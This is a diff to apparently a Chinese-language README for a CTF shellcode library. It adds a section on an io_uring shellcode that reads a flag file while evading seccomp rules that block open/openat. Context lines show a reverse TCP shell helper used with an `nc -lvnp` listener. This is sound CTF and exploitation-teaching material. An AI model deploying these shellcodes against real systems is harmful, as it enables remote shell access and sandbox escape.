@@ -48,6 +48,25 @@ sc = ShellcodeMall.amd64.reverse_tcp_shell("192.168.1.1", 4444)
 
 其中 IP 和端口填攻击机（即运行 `nc -lvnp` 的机器）的地址。目标执行 shellcode 后会主动连接攻击机，攻击机的 nc 会收到一个交互式 shell。
 
+### io_uring 读文件（绕过 seccomp）
+
+当题目通过 seccomp 禁用了 `open` / `openat` / `openat2` 等系统调用时，可以用 `io_uring` 来读取 flag。`io_uring` 通过 `io_uring_setup` (0x1a9) 和 `io_uring_enter` (0x1aa) 两个系统调用完成所有 I/O 操作，很多 seccomp 规则不会拦截它们。
+
+```python
+# 默认读 /flag，输出到 stdout
+sc = ShellcodeMall.amd64.io_uring_cat_flag()
+
+# 自定义路径和输出 fd
+sc = ShellcodeMall.amd64.io_uring_cat_flag("/home/ctf/flag.txt", fd=2)
+```
+
+原理：shellcode 内部依次提交三个 SQE（Submission Queue Entry）：
+1. `IORING_OP_OPENAT` — 打开文件
+2. `IORING_OP_READ` — 读取内容到缓冲区
+3. `IORING_OP_WRITE` — 将缓冲区写到指定 fd
+
+每个操作之间有 1 秒 nanosleep 等待 CQE 完成。shellcode 较大（约 670+ 字节），适合堆上部署或 mmap 场景。
+
 ***
 
 ## 2 i386
